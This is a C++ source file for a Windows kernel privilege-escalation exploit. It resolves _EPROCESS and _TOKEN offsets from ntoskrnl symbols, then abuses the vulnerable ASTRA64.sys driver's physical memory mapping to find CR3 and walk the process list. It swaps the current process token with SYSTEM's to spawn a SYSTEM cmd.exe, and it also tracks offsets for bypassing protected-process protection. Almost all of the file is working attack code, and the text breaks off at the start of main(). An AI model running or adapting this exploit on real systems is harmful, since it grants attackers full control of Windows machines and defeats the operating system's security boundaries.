/*
 * 0_pdb_offsets.cpp — Kernel offset resolver + DKOM SYSTEM escalation
 *
 * Resolves all required kernel offsets from ntoskrnl PDB at runtime.
 * Then uses ASTRA64.sys BYOVD physical memory R/W to perform DKOM token swap
 * -> SYSTEM shell.  Zero hardcoded offsets — stable on any Win10/11 x64 build.
 *
 * Extra offsets resolved vs earlier version:
 *   _EPROCESS.ImageFileName        (CHAR[15] in-kernel process name)
 *   _KPROCESS.DirectoryTableBase   (per-process CR3, embedded in _EPROCESS.Pcb)
 *
 * Build:
 *   cl /nologo /W3 /O2 /std:c++17 /Fe:0_pdb_offsets.exe 0_pdb_offsets.cpp ^
 *      /link kernel32.lib winhttp.lib dbghelp.lib psapi.lib advapi32.lib
 *
 * Usage:
 *   0_pdb_offsets.exe             -- resolve offsets + token swap -> SYSTEM cmd.exe
 *   0_pdb_offsets.exe offsets     -- print offsets only (no driver, no admin needed)
 */

#define WIN32_LEAN_AND_MEAN
#define NOMINMAX
#include <windows.h>
#include <winhttp.h>
#include <dbghelp.h>
#include <psapi.h>
#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <string.h>
#include <vector>
#include <algorithm>

#pragma comment(lib, "winhttp.lib")
#pragma comment(lib, "dbghelp.lib")
#pragma comment(lib, "psapi.lib")
#pragma comment(lib, "advapi32.lib")

// ─────────────────────────────────────────────────────────────────────────────
//  ASTRA64 constants
// ─────────────────────────────────────────────────────────────────────────────

#define IOCTL_MAP_PHYS    0x80002008u
#define DEVICE_PATH       "\\\\.\\Astra32Device0"
#define KUSD_VA           0xFFFFF78000000000ULL
#define EX_FAST_REF_MASK  0xFULL

static bool is_kptr(uint64_t v) {
    return v > 0xFFFF800000000000ULL && v < 0xFFFFFFFFFFFFFFF0ULL;
}

// ─────────────────────────────────────────────────────────────────────────────
//  KernelOffsets — all fields resolved from PDB at runtime, zero hardcodes
// ─────────────────────────────────────────────────────────────────────────────

struct KernelOffsets {
    // _EPROCESS fields
    DWORD eprocess_UniqueProcessId;         // HANDLE  (walk process list)
    DWORD eprocess_ActiveProcessLinks;      // LIST_ENTRY  (Flink/Blink circular)
    DWORD eprocess_Token;                   // _EX_FAST_REF: ptr & ~0xF = _TOKEN*
    DWORD eprocess_Protection;              // PS_PROTECTION byte (PPL bypass)
    DWORD eprocess_ImageFileName;           // CHAR[15] in-kernel process name

    // _KPROCESS (embedded at _EPROCESS+0 as Pcb, so offset == _EPROCESS offset)
    DWORD kprocess_DirectoryTableBase;      // per-process CR3

    // _TOKEN
    DWORD token_Privileges;                 // _SEP_TOKEN_PRIVILEGES
                                            //   Present        = +0
                                            //   Enabled        = +8
                                            //   EnabledByDefault = +16

    // Global symbol RVAs (add nt_kbase at runtime to get VA)
    DWORD64 rva_PsInitialSystemProcess;
    DWORD64 rva_PsLoadedModuleList;

    // Runtime ntoskrnl base from EnumDeviceDrivers
    DWORD64 nt_kbase;

    bool valid;
};

// ─────────────────────────────────────────────────────────────────────────────
//  PE / PDB helpers
// ─────────────────────────────────────────────────────────────────────────────

struct CV_INFO_PDB70 {
    DWORD CvSignature;   // 'RSDS'
    GUID  Signature;
    DWORD Age;
    CHAR  PdbFileName[1];
};

static bool GetKernelInfo(PVOID* outBase, char outPath[MAX_PATH]) {
    LPVOID drivers[1024];
    DWORD cbNeeded = 0;
    if (!EnumDeviceDrivers(drivers, sizeof(drivers), &cbNeeded) || !cbNeeded)
        return false;
    DWORD count = cbNeeded / sizeof(LPVOID);
    for (DWORD i = 0; i < count; i++) {
        char name[64] = {};
        GetDeviceDriverBaseNameA(drivers[i], name, sizeof(name));
        if (_stricmp(name, "ntoskrnl.exe") != 0) continue;
        *outBase = drivers[i];
        char sysdir[MAX_PATH];
        GetSystemDirectoryA(sysdir, MAX_PATH);
        snprintf(outPath, MAX_PATH, "%s\\%s", sysdir, name);
        return GetFileAttributesA(outPath) != INVALID_FILE_ATTRIBUTES;
    }
    return false;
}

static DWORD RvaToFileOffset(PVOID base, DWORD rva) {
    auto dos = (PIMAGE_DOS_HEADER)base;
    auto nt  = (PIMAGE_NT_HEADERS64)((BYTE*)base + dos->e_lfanew);
    auto sec = IMAGE_FIRST_SECTION(nt);
    for (WORD i = 0; i < nt->FileHeader.NumberOfSections; i++)
        if (rva >= sec[i].VirtualAddress &&
            rva <  sec[i].VirtualAddress + sec[i].Misc.VirtualSize)
            return sec[i].PointerToRawData + (rva - sec[i].VirtualAddress);
    return 0;
}

static bool GetPdbInfo(const char* pePath, GUID* outGuid, DWORD* outAge,
                       char outName[256]) {
    HANDLE hFile = CreateFileA(pePath, GENERIC_READ, FILE_SHARE_READ,
                               nullptr, OPEN_EXISTING, 0, nullptr);
    if (hFile == INVALID_HANDLE_VALUE) return false;
    HANDLE hMap = CreateFileMappingA(hFile, nullptr, PAGE_READONLY, 0, 0, nullptr);
    CloseHandle(hFile);
    if (!hMap) return false;
    PVOID base = MapViewOfFile(hMap, FILE_MAP_READ, 0, 0, 0);
    CloseHandle(hMap);
    if (!base) return false;

    bool found = false;
    __try {
        auto dos = (PIMAGE_DOS_HEADER)base;
        auto nt  = (PIMAGE_NT_HEADERS64)((BYTE*)base + dos->e_lfanew);
        auto& dd = nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_DEBUG];
        if (!dd.VirtualAddress || !dd.Size) __leave;
        auto entry = (PIMAGE_DEBUG_DIRECTORY)((BYTE*)base +
                                               RvaToFileOffset(base, dd.VirtualAddress));
        DWORD cnt = dd.Size / sizeof(IMAGE_DEBUG_DIRECTORY);
        for (DWORD i = 0; i < cnt && !found; i++) {
            if (entry[i].Type != IMAGE_DEBUG_TYPE_CODEVIEW) continue;
            auto cv = (CV_INFO_PDB70*)((BYTE*)base + entry[i].PointerToRawData);
            if (cv->CvSignature != 0x53445352) continue;
            *outGuid = cv->Signature;
            *outAge  = cv->Age;
            strncpy_s(outName, 256, cv->PdbFileName, _TRUNCATE);
            // Strip any directory prefix embedded in the PDB filename
            char* sl = strrchr(outName, '\\');
            if (sl) { size_t n = strlen(sl+1)+1; memmove(outName, sl+1, n); }
            found = true;
        }
    } __except (EXCEPTION_EXECUTE_HANDLER) {}
    UnmapViewOfFile(base);
    return found;
}

static void FormatGuidAge(const GUID& g, DWORD age, char out[72]) {
    snprintf(out, 72, "%08X%04X%04X%02X%02X%02X%02X%02X%02X%02X%02X%X",
        g.Data1, g.Data2, g.Data3,
        g.Data4[0], g.Data4[1], g.Data4[2], g.Data4[3],
        g.Data4[4], g.Data4[5], g.Data4[6], g.Data4[7], age);
}

static bool DownloadPdb(const char* url, const char* dest) {
    printf("    URL : %s\n", url);
    wchar_t wUrl[512], wDest[MAX_PATH];
    MultiByteToWideChar(CP_ACP, 0, url,  -1, wUrl,  512);
    MultiByteToWideChar(CP_ACP, 0, dest, -1, wDest, MAX_PATH);

    HINTERNET hS = WinHttpOpen(L"PdbFetch/1.0",
                               WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
                               WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
    if (!hS) return false;

    URL_COMPONENTS uc = {}; wchar_t host[256] = {}, path[512] = {};
    uc.dwStructSize = sizeof(uc);
    uc.lpszHostName = host; uc.dwHostNameLength = 256;
    uc.lpszUrlPath  = path; uc.dwUrlPathLength  = 512;
    WinHttpCrackUrl(wUrl, 0, 0, &uc);

    HINTERNET hC = WinHttpConnect(hS, host, uc.nPort, 0);
    DWORD fl = (uc.nScheme == INTERNET_SCHEME_HTTPS) ? WINHTTP_FLAG_SECURE : 0;
    HINTERNET hR = hC ? WinHttpOpenRequest(hC, L"GET", path, nullptr,
                                            WINHTTP_NO_REFERER,
                                            WINHTTP_DEFAULT_ACCEPT_TYPES, fl) : nullptr;
    bool ok = hR &&
              WinHttpSendRequest(hR, WINHTTP_NO_ADDITIONAL_HEADERS, 0,
                                 WINHTTP_NO_REQUEST_DATA, 0, 0, 0) &&
              WinHttpReceiveResponse(hR, nullptr);
    if (ok) {
        DWORD sc = 0, scl = sizeof(sc);
        WinHttpQueryHeaders(hR, WINHTTP_QUERY_STATUS_CODE | WINHTTP_QUERY_FLAG_NUMBER,
                            nullptr, &sc, &scl, nullptr);
        if (sc != 200) { printf("    [-] HTTP %lu\n", sc); ok = false; }
    }
    if (ok) {
        HANDLE hF = CreateFileW(wDest, GENERIC_WRITE, 0, nullptr,
                                CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, nullptr);
        if (hF == INVALID_HANDLE_VALUE) { ok = false; }
        else {
            BYTE buf[65536]; DWORD rd; LONGLONG total = 0;
            while (WinHttpReadData(hR, buf, sizeof(buf), &rd) && rd)
                { DWORD wr; WriteFile(hF, buf, rd, &wr, nullptr); total += rd; }
            CloseHandle(hF);
            printf("    [+] Downloaded %lld KB\n", total / 1024);
        }
    }
    if (hR) WinHttpCloseHandle(hR);
    if (hC) WinHttpCloseHandle(hC);
    WinHttpCloseHandle(hS);
    if (!ok) DeleteFileW(wDest);
    return ok;
}

// ─────────────────────────────────────────────────────────────────────────────
//  DbgHelp type/symbol enumeration helpers
// ─────────────────────────────────────────────────────────────────────────────

struct TypeCtx   { const char* name; ULONG id; bool found; };
struct GlobalCtx { const char* name; DWORD64 base, rva; bool found; };

static BOOL CALLBACK OnType(PSYMBOL_INFO si, ULONG, PVOID ud) {
    auto c = (TypeCtx*)ud;
    if (si->Name && _stricmp(si->Name, c->name) == 0)
        { c->id = (ULONG)si->TypeIndex; c->found = true; return FALSE; }
    return TRUE;
}
static BOOL CALLBACK OnSym(PSYMBOL_INFO si, ULONG, PVOID ud) {
    auto c = (GlobalCtx*)ud;
    if (si->Name && strcmp(si->Name, c->name) == 0)
        { c->rva = si->Address - c->base; c->found = true; return FALSE; }
    return TRUE;
}

static DWORD FieldOffset(HANDLE hSym, DWORD64 base,
                          const char* sname, const char* fname) {
    TypeCtx tc{ sname, 0, false };
    SymEnumTypesByName(hSym, base, sname, OnType, &tc);
    if (!tc.found) { printf("    [-] type '%s' not found\n", sname); return (DWORD)-1; }

    DWORD n = 0;
    SymGetTypeInfo(hSym, base, tc.id, TI_GET_CHILDRENCOUNT, &n);
    if (!n) return (DWORD)-1;

    auto kids = (TI_FINDCHILDREN_PARAMS*)malloc(
                    sizeof(TI_FINDCHILDREN_PARAMS) + n * sizeof(ULONG));
    if (!kids) return (DWORD)-1;
    kids->Count = n; kids->Start = 0;
    SymGetTypeInfo(hSym, base, tc.id, TI_FINDCHILDREN, kids);

    DWORD result = (DWORD)-1;
    for (DWORD i = 0; i < n; i++) {
        WCHAR* wn = nullptr;
        if (!SymGetTypeInfo(hSym, base, kids->ChildId[i], TI_GET_SYMNAME, &wn)) continue;
        char narrow[128];
        WideCharToMultiByte(CP_ACP, 0, wn, -1, narrow, sizeof(narrow), nullptr, nullptr);
        LocalFree(wn);
        if (_stricmp(narrow, fname) == 0) {
            SymGetTypeInfo(hSym, base, kids->ChildId[i], TI_GET_OFFSET, &result);
            break;
        }
    }
    free(kids);
    return result;
}

static DWORD64 GlobalRva(HANDLE hSym, DWORD64 base, const char* name) {
    GlobalCtx gc{ name, base, 0, false };
    SymEnumSymbols(hSym, base, name, OnSym, &gc);
    if (!gc.found) printf("    [-] global '%s' not found\n", name);
    return gc.rva;
}

// ─────────────────────────────────────────────────────────────────────────────
//  ResolvePdbOffsets — main entry point for PDB resolution
// ─────────────────────────────────────────────────────────────────────────────

static KernelOffsets ResolvePdbOffsets() {
    KernelOffsets r = {};

    printf("[*] Locating ntoskrnl.exe...\n");
    PVOID kBase = nullptr; char kPath[MAX_PATH] = {};
    if (!GetKernelInfo(&kBase, kPath)) { printf("[-] GetKernelInfo failed\n"); return r; }
    r.nt_kbase = (DWORD64)(uintptr_t)kBase;
    printf("[+] Base : %p\n", kBase);
    printf("[+] Path : %s\n", kPath);

    printf("[*] Extracting PDB GUID from PE debug directory...\n");
    GUID guid = {}; DWORD age = 0; char pdbName[256] = {};
    if (!GetPdbInfo(kPath, &guid, &age, pdbName))
        { printf("[-] GetPdbInfo failed\n"); return r; }
    char guidAge[72]; FormatGuidAge(guid, age, guidAge);
    printf("[+] PDB  : %s\n", pdbName);
    printf("[+] Key  : %s\n", guidAge);

    // Cache PDB in %TEMP% keyed by GUID so different builds don't collide
    char tmp[MAX_PATH], cached[MAX_PATH], prefix[256];
    GetTempPathA(MAX_PATH, tmp);
    strncpy_s(prefix, pdbName, _TRUNCATE);
    char* dot = strrchr(prefix, '.'); if (dot) *dot = '\0';
    snprintf(cached, MAX_PATH, "%s%s_%s.pdb", tmp, prefix, guidAge);

    if (GetFileAttributesA(cached) == INVALID_FILE_ATTRIBUTES) {
        printf("[*] Downloading PDB from msdl.microsoft.com...\n");
        char url[512];
        snprintf(url, 512,
                 "https://msdl.microsoft.com/download/symbols/%s/%s/%s",
                 pdbName, guidAge, pdbName);
        if (!DownloadPdb(url, cached)) { printf("[-] Download failed\n"); return r; }
        printf("[+] Saved : %s\n", cached);
    } else {
        printf("[+] Cache : %s\n", cached);
    }

    printf("[*] Loading PDB with DbgHelp...\n");
    HANDLE hSym = GetCurrentProcess();
    // SYMOPT_DEFERRED_LOADS must NOT be set — it prevents SymEnumTypesByName
    // from resolving type info upfront, which makes struct field lookup fail.
    SymSetOptions(SYMOPT_UNDNAME | SYMOPT_NO_PROMPTS);
    if (!SymInitialize(hSym, nullptr, FALSE))
        { printf("[-] SymInitialize: %lu\n", GetLastError()); return r; }

    wchar_t wPdb[MAX_PATH];
    MultiByteToWideChar(CP_ACP, 0, cached, -1, wPdb, MAX_PATH);
    // Fake base: symbol RVA = symbol.Address - FAKE_BASE
    // Runtime VA = nt_kbase + RVA
    const DWORD64 FAKE_BASE = 0x1000000ULL;
    DWORD64 modBase = SymLoadModuleExW(hSym, nullptr, wPdb, nullptr,
                                       FAKE_BASE, 0, nullptr, 0);
    if (!modBase) {
        printf("[-] SymLoadModuleEx: %lu\n", GetLastError());
        SymCleanup(hSym); return r;
    }

    printf("[*] Resolving struct field offsets...\n");
    r.eprocess_UniqueProcessId      = FieldOffset(hSym, modBase, "_EPROCESS", "UniqueProcessId");
    r.eprocess_ActiveProcessLinks   = FieldOffset(hSym, modBase, "_EPROCESS", "ActiveProcessLinks");
    r.eprocess_Token                = FieldOffset(hSym, modBase, "_EPROCESS", "Token");
    r.eprocess_Protection           = FieldOffset(hSym, modBase, "_EPROCESS", "Protection");
    r.eprocess_ImageFileName        = FieldOffset(hSym, modBase, "_EPROCESS", "ImageFileName");
    // DirectoryTableBase lives in _KPROCESS, which is embedded at _EPROCESS+0 (Pcb field),
    // so the byte offset within _KPROCESS == byte offset within _EPROCESS directly.
    r.kprocess_DirectoryTableBase   = FieldOffset(hSym, modBase, "_KPROCESS", "DirectoryTableBase");
    r.token_Privileges              = FieldOffset(hSym, modBase, "_TOKEN",    "Privileges");

    printf("[*] Resolving global symbol RVAs...\n");
    r.rva_PsInitialSystemProcess    = GlobalRva(hSym, modBase, "PsInitialSystemProcess");
    r.rva_PsLoadedModuleList        = GlobalRva(hSym, modBase, "PsLoadedModuleList");

    SymUnloadModule64(hSym, modBase);
    SymCleanup(hSym);

    r.valid = (r.eprocess_UniqueProcessId    != (DWORD)-1) &&
              (r.eprocess_ActiveProcessLinks != (DWORD)-1) &&
              (r.eprocess_Token              != (DWORD)-1) &&
              (r.eprocess_Protection         != (DWORD)-1) &&
              (r.eprocess_ImageFileName      != (DWORD)-1) &&
              (r.kprocess_DirectoryTableBase != (DWORD)-1) &&
              (r.token_Privileges            != (DWORD)-1) &&
              (r.rva_PsInitialSystemProcess  != 0)         &&
              (r.nt_kbase                    != 0);
    return r;
}

static void PrintOffsets(const KernelOffsets& o) {
    printf("\n[+] _EPROCESS offsets:\n");
    printf("    UniqueProcessId        = +0x%03X\n", o.eprocess_UniqueProcessId);
    printf("    ActiveProcessLinks     = +0x%03X  (Flink=+0, Blink=+8)\n",
           o.eprocess_ActiveProcessLinks);
    printf("    Token                  = +0x%03X  (_EX_FAST_REF: &~0xF -> _TOKEN*)\n",
           o.eprocess_Token);
    printf("    Protection             = +0x%03X  (PS_PROTECTION byte — PPL bypass)\n",
           o.eprocess_Protection);
    printf("    ImageFileName          = +0x%03X  (CHAR[15] in-kernel name)\n",
           o.eprocess_ImageFileName);
    printf("\n[+] _KPROCESS offsets (embedded in _EPROCESS.Pcb at +0):\n");
    printf("    DirectoryTableBase     = +0x%03X  (per-process CR3)\n",
           o.kprocess_DirectoryTableBase);
    printf("\n[+] _TOKEN offsets:\n");
    printf("    Privileges             = +0x%03X  (_SEP_TOKEN_PRIVILEGES)\n",
           o.token_Privileges);
    printf("      .Present             = +0x%03X\n", o.token_Privileges + 0);
    printf("      .Enabled             = +0x%03X\n", o.token_Privileges + 8);
    printf("      .EnabledByDefault    = +0x%03X\n", o.token_Privileges + 16);
    printf("\n[+] Global symbols (RVA from ntoskrnl base):\n");
    printf("    PsInitialSystemProcess = 0x%llX\n",
           (unsigned long long)o.rva_PsInitialSystemProcess);
    printf("    PsLoadedModuleList     = 0x%llX\n",
           (unsigned long long)o.rva_PsLoadedModuleList);
    printf("    ntoskrnl base          = 0x%llX  (runtime)\n",
           (unsigned long long)o.nt_kbase);

    printf("\n[*] Cross-check vs known hardcoded values:\n");
    struct Check { const char* n; DWORD got, w10, w11; } checks[] = {
        { "EPROCESS.UniqueProcessId",    o.eprocess_UniqueProcessId,    0x440, 0x1D0 },
        { "EPROCESS.ActiveProcessLinks", o.eprocess_ActiveProcessLinks, 0x448, 0x1D8 },
        { "EPROCESS.Token",              o.eprocess_Token,              0x4B8, 0x248 },
        { "TOKEN.Privileges (Present)",  o.token_Privileges + 0,        0x040, 0x040 },
        { "TOKEN.Privileges (Enabled)",  o.token_Privileges + 8,        0x048, 0x048 },
    };
    for (auto& c : checks) {
        bool match = (c.got == c.w10 || c.got == c.w11);
        printf("    %-36s 0x%03X  [%s]\n",
               c.n, c.got, match ? "OK" : "DIFFERS — new build?");
    }
}

// ─────────────────────────────────────────────────────────────────────────────
//  ASTRA64 physical memory R/W primitives
// ─────────────────────────────────────────────────────────────────────────────

#pragma pack(push, 1)
struct MAP_INPUT {
    uint32_t interface_type, bus_number;
    uint64_t physical_addr;
    uint32_t address_space, size;
};
#pragma pack(pop)

struct Astra {
    HANDLE   dev     = INVALID_HANDLE_VALUE;
    uint64_t hint_hi = 0;

    bool open() {
        dev = CreateFileA(DEVICE_PATH, GENERIC_READ | GENERIC_WRITE,
                          FILE_SHARE_READ | FILE_SHARE_WRITE, NULL,
                          OPEN_EXISTING, 0, NULL);
        if (dev == INVALID_HANDLE_VALUE)
            { printf("[-] %s: %lu\n", DEVICE_PATH, GetLastError()); return false; }
        printf("[+] Device: %s\n", DEVICE_PATH);
        return true;
    }
    void close() {
        if (dev != INVALID_HANDLE_VALUE) { CloseHandle(dev); dev = INVALID_HANDLE_VALUE; }
    }

    uintptr_t map_page(uint64_t phys) {
        MAP_INPUT in = {}; in.physical_addr = phys; in.size = 0x1000;
        DWORD ret = 0;
        if (!DeviceIoControl(dev, IOCTL_MAP_PHYS, &in, sizeof(in),
                             &in, sizeof(in), &ret, NULL)) return 0;
        uint64_t lo = (uint64_t)(uint32_t)in.interface_type;
        if (!lo) return 0;
        auto try_hi = [&](uint64_t hi) -> uintptr_t {
            uint64_t cand = (hi << 32) | lo;
            MEMORY_BASIC_INFORMATION mbi;
            return (VirtualQuery((LPCVOID)cand, &mbi, sizeof(mbi)) > 0 &&
                    mbi.State == MEM_COMMIT) ? (uintptr_t)cand : 0;
        };
        if (auto va = try_hi(hint_hi)) return va;
        for (uint64_t hi = 0; hi < 0x8000; hi++) {
            if (hi == hint_hi) continue;
            if (auto va = try_hi(hi)) { hint_hi = hi; return va; }
        }
        return 0;
    }
    void unmap(uintptr_t va) { UnmapViewOfFile((LPCVOID)(va & ~(uintptr_t)0xFFF)); }

    static bool safe_copy(uintptr_t src, void* dst, size_t n) {
        SIZE_T rd = 0;
        return ReadProcessMemory(GetCurrentProcess(), (LPCVOID)src, dst, n, &rd) && rd == n;
    }
    bool read_phys(uint64_t addr, void* buf, size_t len) {
        auto* dst = (uint8_t*)buf;
        for (size_t pos = 0; pos < len;) {
            uint64_t pg = addr & ~(uint64_t)0xFFF;
            size_t   off   = (size_t)(addr & 0xFFF);
            size_t   chunk = std::min(len - pos, (size_t)(0x1000 - off));
            uintptr_t va = map_page(pg); if (!va) return false;
            bool ok = safe_copy(va + off, dst + pos, chunk); unmap(va);
            if (!ok) return false; pos += chunk; addr += chunk;
        }
        return true;
    }
    bool write_phys(uint64_t addr, const void* buf, size_t len) {
        auto* src = (const uint8_t*)buf;
        for (size_t pos = 0; pos < len;) {
            uint64_t pg = addr & ~(uint64_t)0xFFF;
            size_t   off   = (size_t)(addr & 0xFFF);
            size_t   chunk = std::min(len - pos, (size_t)(0x1000 - off));
            uintptr_t va = map_page(pg); if (!va) return false;
            memcpy((void*)(va + off), src + pos, chunk); unmap(va);
            pos += chunk; addr += chunk;
        }
        return true;
    }
    bool read_u64 (uint64_t pa, uint64_t* v) { return read_phys(pa, v, 8); }
    bool read_u32 (uint64_t pa, uint32_t* v) { return read_phys(pa, v, 4); }
    bool write_u64(uint64_t pa, uint64_t   v) { return write_phys(pa, &v, 8); }
};

// ─────────────────────────────────────────────────────────────────────────────
//  4-level x64 page table walk
// ─────────────────────────────────────────────────────────────────────────────

static bool virt_to_phys(Astra* d, uint64_t cr3, uint64_t va, uint64_t* pa) {
    auto idx = [&](int l) { return (va >> (12 + l * 9)) & 0x1FF; };
    uint64_t e = 0;
    if (!d->read_phys((cr3 & 0x000FFFFFFFFFF000ULL) + idx(3)*8, &e, 8) || !(e&1)) return false;
    if (!d->read_phys((e   & 0x000FFFFFFFFFF000ULL) + idx(2)*8, &e, 8) || !(e&1)) return false;
    if (e & 0x80) { *pa = (e & 0x000FFFFC0000000ULL) | (va & 0x3FFFFFFFULL); return true; }
    if (!d->read_phys((e   & 0x000FFFFFFFFFF000ULL) + idx(1)*8, &e, 8) || !(e&1)) return false;
    if (e & 0x80) { *pa = (e & 0x000FFFFFFFE00000ULL) | (va & 0x1FFFFFULL);  return true; }
    if (!d->read_phys((e   & 0x000FFFFFFFFFF000ULL) + idx(0)*8, &e, 8) || !(e&1)) return false;
    *pa = (e & 0x000FFFFFFFFFF000ULL) | (va & 0xFFFULL);
    return true;
}

static bool vread(Astra* d, uint64_t cr3, uint64_t va, void* buf, size_t len) {
    auto* dst = (uint8_t*)buf;
    for (size_t pos = 0; pos < len;) {
        size_t   off   = (size_t)(va & 0xFFF);
        size_t   chunk = std::min(len - pos, (size_t)(0x1000 - off));
        uint64_t pa;
        if (!virt_to_phys(d, cr3, va, &pa)) return false;
        if (!d->read_phys(pa, dst + pos, chunk)) return false;
        pos += chunk; va += chunk;
    }
    return true;
}
static bool vread_u64(Astra* d, uint64_t cr3, uint64_t va, uint64_t* v) {
    return vread(d, cr3, va, v, 8);
}
static bool vread_u32(Astra* d, uint64_t cr3, uint64_t va, uint32_t* v) {
    return vread(d, cr3, va, v, 4);
}

// ─────────────────────────────────────────────────────────────────────────────
//  CR3 finder — scan low 64 MB physical RAM
//  Verify candidate by resolving KUSER_SHARED_DATA and checking NtMajorVersion
// ─────────────────────────────────────────────────────────────────────────────

static uint64_t find_cr3(Astra* d) {
    // PML4 index for KUSD_VA (0xFFFFF78000000000)
    const uint64_t idx = (KUSD_VA >> 39) & 0x1FF;
    printf("[*] Scanning low 64 MB physical RAM for CR3...\n");

    std::vector<uint64_t> cands;
    cands.reserve(256);

    for (uint64_t pg = 0; pg < 0x4000000ULL; pg += 0x1000) {
        uint64_t e = 0;
        if (!d->read_phys(pg + idx * 8, &e, 8) || !(e & 1)) continue;
        // PML4 entry points to a PDPT — must be in low 2 GB physical
        if ((e & 0x000FFFFFFFFFF000ULL) > 0x80000000ULL) continue;
        cands.push_back(pg);
    }

    printf("[*] %zu PML4 candidates, verifying...\n", cands.size());
    for (uint64_t cr3 : cands) {
        uint64_t pa = 0; uint32_t v = 0;
        // NtMajorVersion at KUSER_SHARED_DATA+0x26C must be 10 (Win10/11)
        if (virt_to_phys(d, cr3, KUSD_VA, &pa) &&
            d->read_u32(pa + 0x26C, &v) && v == 10)
            return cr3;
    }
    return 0;
}

// ─────────────────────────────────────────────────────────────────────────────
//  EPROCESS list walker
//  Returns System EPROCESS VA and target EPROCESS VA (by PID).
//  Prints each process seen using the in-kernel ImageFileName field.
// ─────────────────────────────────────────────────────────────────────────────

static bool find_eprocess(Astra* d, uint64_t cr3, const KernelOffsets& off,
                           uint32_t tgt_pid,
                           uint64_t* sys_ep, uint64_t* tgt_ep) {
    // Dereference PsInitialSystemProcess -> System _EPROCESS VA
    uint64_t psisp_va = off.nt_kbase + off.rva_PsInitialSystemProcess;
    uint64_t se = 0;
    if (!vread_u64(d, cr3, psisp_va, &se) || !is_kptr(se)) {
        printf("[-] *PsInitialSystemProcess invalid\n"); return false;
    }
    uint64_t spid = 0;
    vread_u64(d, cr3, se + off.eprocess_UniqueProcessId, &spid);
    if ((uint32_t)spid != 4) {
        printf("[-] System PID = %llu (expected 4)\n", (unsigned long long)spid);
        return false;
    }
    *sys_ep = se;
    if (tgt_pid == 4) { *tgt_ep = se; return true; }

    printf("[*] Process list:\n");
    printf("    %-6s  %-16s  %s\n", "PID", "Name", "EPROCESS");

    // Walk Blink of System's ActiveProcessLinks (head of circular list)
    uint64_t head = 0, flink = 0;
    if (!vread_u64(d, cr3, se + off.eprocess_ActiveProcessLinks + 8, &head) ||
        !is_kptr(head)) return false;
    if (!vread_u64(d, cr3, head, &flink)) return false;

    bool found = false;
    for (int i = 0; i < 4096 && flink != head; i++) {
        uint64_t ep_va = flink - off.eprocess_ActiveProcessLinks;
        uint64_t pid = 0;
        if (!vread_u64(d, cr3, ep_va + off.eprocess_UniqueProcessId, &pid)) break;

        char imgname[16] = {};
        vread(d, cr3, ep_va + off.eprocess_ImageFileName, imgname, 15);
        imgname[15] = '\0';

        printf("    %-6u  %-16s  0x%llX%s\n",
               (uint32_t)pid, imgname[0] ? imgname : "?",
               (unsigned long long)ep_va,
               (uint32_t)pid == tgt_pid ? "  <-- target" : "");

        if ((uint32_t)pid == tgt_pid) { *tgt_ep = ep_va; found = true; }

        uint64_t nxt = 0;
        if (!vread_u64(d, cr3, flink, &nxt) || !is_kptr(nxt)) break;
        flink = nxt;
    }

    if (!found) printf("[-] PID %u not found\n", tgt_pid);
    return found;
}

// ─────────────────────────────────────────────────────────────────────────────
//  DKOM token swap -> SYSTEM
// ─────────────────────────────────────────────────────────────────────────────

static int run_exploit(const KernelOffsets& off) {
    printf("\n[*] Opening ASTRA64 device...\n");
    Astra d;
    if (!d.open()) return 1;

    printf("\n[*] Finding CR3...\n");
    uint64_t cr3 = find_cr3(&d);
    if (!cr3) { printf("[-] CR3 not found\n"); d.close(); return 1; }
    printf("[+] CR3 = 0x%llX\n", (unsigned long long)cr3);

    uint32_t my_pid = GetCurrentProcessId();
    printf("\n[*] Walking EPROCESS list (our PID = %u)...\n", my_pid);
    uint64_t sys_ep = 0, my_ep = 0;
    if (!find_eprocess(&d, cr3, off, my_pid, &sys_ep, &my_ep)) {
        d.close(); return 1;
    }
    printf("[+] System EPROCESS = 0x%llX\n", (unsigned long long)sys_ep);
    printf("[+] Our    EPROCESS = 0x%llX\n", (unsigned long long)my_ep);

    // Translate EPROCESS.Token field VA -> PA for both processes
    uint64_t pa_sys_tok = 0, pa_my_tok = 0;
    if (!virt_to_phys(&d, cr3, sys_ep + off.eprocess_Token, &pa_sys_tok) ||
        !virt_to_phys(&d, cr3, my_ep  + off.eprocess_Token, &pa_my_tok)) {
        printf("[-] virt_to_phys Token field failed\n"); d.close(); return 1;
    }

    uint64_t sys_tok = 0, orig_tok = 0;
    d.read_u64(pa_sys_tok, &sys_tok);
    d.read_u64(pa_my_tok,  &orig_tok);
    printf("[+] System token  = 0x%llX\n", (unsigned long long)sys_tok);
    printf("[+] Our    token  = 0x%llX\n", (unsigned long long)orig_tok);

    // Swap our token with System's
    printf("\n[*] Swapping token...\n");
    if (!d.write_u64(pa_my_tok, sys_tok)) {
        printf("[-] write_u64 token failed\n"); d.close(); return 1;
    }

    // Verify elevation
    BOOL elev = FALSE;
    HANDLE hTok = NULL;
    if (OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hTok)) {
        TOKEN_ELEVATION te; DWORD sz = sizeof(te);
        GetTokenInformation(hTok, TokenElevation, &te, sz, &sz);
        elev = te.TokenIsElevated;
        CloseHandle(hTok);
    }
    if (!elev) { printf("[-] Token swap did not elevate — restore\n"); goto restore; }
    printf("[+] Token swapped — now SYSTEM\n");

    {
        // Spawn SYSTEM cmd.exe
        STARTUPINFOA si = { sizeof(si) };
        PROCESS_INFORMATION pi = {};
        char cmd[] = "cmd.exe";
        if (CreateProcessA(NULL, cmd, NULL, NULL, FALSE,
                           CREATE_NEW_CONSOLE, NULL, NULL, &si, &pi)) {
            printf("[+] SYSTEM cmd.exe spawned (PID %lu)\n", pi.dwProcessId);
            printf("    Run 'whoami' in the new window to confirm.\n");
            CloseHandle(pi.hProcess);
            CloseHandle(pi.hThread);
        } else {
            printf("[-] CreateProcess: %lu\n", GetLastError());
        }
        // Keep SYSTEM token until shell likely started, then restore
        Sleep(3000);
    }

restore:
    {
        uint64_t pa2 = 0;
        if (virt_to_phys(&d, cr3, my_ep + off.eprocess_Token, &pa2))
            d.write_u64(pa2, orig_tok);
        printf("[+] Token restored\n");
    }
    d.close();
    return elev ? 0 : 1;
}

// ─────────────────────────────────────────────────────────────────────────────
//  main
// ─────────────────────────────────────────────────────────────────────────────

int main(int argc, char** argv) {
